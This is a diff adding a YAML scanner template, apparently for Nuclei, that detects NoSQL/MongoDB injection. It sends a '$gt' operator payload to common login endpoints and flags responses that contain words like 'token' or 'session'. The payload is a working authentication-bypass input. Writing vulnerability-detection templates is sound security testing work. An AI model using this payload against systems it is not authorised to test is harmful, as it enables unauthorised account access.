@@ -1,0 +1,30 @@
+id: nosql-injection
+info:
+  name: NoSQL 注入检测
+  severity: high
+  description: 检测 MongoDB/NoSQL 注入漏洞
+  tags: nosql,injection,mongodb,high
+  author: poxiao
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/v1/auth"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":{"$gt":""},"password":{"$gt":""}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "token"
+          - "session"
+          - "success"
+          - "authenticated"
+          - "user"
+        condition: or
+        part: body
